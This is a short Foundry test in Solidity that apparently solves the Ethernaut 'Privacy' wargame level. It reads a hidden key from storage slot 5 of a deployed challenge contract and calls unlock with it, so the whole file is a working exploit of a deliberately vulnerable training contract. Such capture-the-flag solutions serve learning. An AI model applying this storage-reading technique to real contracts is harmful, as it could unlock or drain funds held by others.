// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel12.sol";

contract Attacker is Test {
    Privacy level12 = Privacy(0x76Bbb73F9B7996b7980d184808469F8B5F240A8F);

    function test() external {
        bytes32 key = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(key));

        assertEq(level12.locked(), false);
    }
}
